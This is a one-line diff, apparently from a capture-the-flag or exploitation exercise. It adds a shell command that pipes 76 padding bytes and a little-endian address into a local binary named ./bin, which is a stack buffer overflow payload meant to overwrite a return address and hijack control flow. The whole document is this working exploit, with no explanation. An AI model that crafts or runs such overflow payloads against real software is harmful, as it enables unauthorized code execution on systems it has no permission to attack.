@@ -1,0 +1,1 @@
+python3 -c 'import sys; sys.stdout.buffer.write(b"A"*76 + b"\xf4\x83\x04\x08")' | ./bin
